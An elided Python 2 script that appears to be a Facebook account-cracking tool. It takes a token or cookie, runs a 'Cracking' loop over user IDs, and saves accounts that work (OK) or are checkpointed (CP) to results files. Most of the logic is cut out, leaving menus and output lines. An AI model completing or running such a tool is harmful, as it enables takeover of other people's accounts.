...
def login():
	...
	try:
		...
		print(" "+N+"\n ["+N+"?"+N+"]"+N+" Select Login Metode "+N+"!!")
		print(" "+N+" ["+N+"1"+N+"]"+N+" Login With Token")
		print(" "+N+" ["+N+"2"+N+"]"+N+" Login With Cookie")
		ask = raw_input("\n "+N+"[?] Choose : ")
		if ask =="":
			login()
...
def cookie():
	print(" "+N+"\n ["+N+"!"+N+"]"+N+" Enter Your Facebook Cookies "+N+"!!")
	...
	if ask =="":
		...
		if ask =="":
			...
			try:
				...
				print("  "+N+"[#]--------------------------------------------") 
				print(" "+N+"[+] Results OK Date : \033[0;92m%s-%s-%s "+N+"Total : %s\033[0;92m"%(ha, op, ta,len(totalok)))
			...
			try:
				...
				print("  "+N+"[#]--------------------------------------------") 
				print(" "+N+"[+] Results CP Date : \033[0;92m%s-%s-%s "+N+"Total : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
...
def public():
	...
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"[+] Account OK Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"[+] Account CP Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
...
def manual():
	...
	def main(user):
		global loop, token
		print'\r '+N+' [\x1b[%s] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
